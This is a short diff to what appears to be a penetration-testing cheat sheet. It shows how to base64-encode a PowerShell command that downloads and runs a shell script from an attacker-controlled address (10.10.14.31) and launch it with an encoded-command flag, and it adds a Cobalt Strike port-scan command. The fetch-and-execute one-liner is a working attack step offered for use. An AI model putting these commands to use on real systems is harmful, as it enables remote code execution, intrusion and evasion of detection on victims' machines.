@@ -27,7 +27,12 @@ PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetByte
 $ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
 ```
 
-Finally
+- Finally
 ```powershell
 powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
+```
+
+Use you can check open ports using Cobalt Strike:
+```
+portscan [ip or ip range] [ports]
 ```
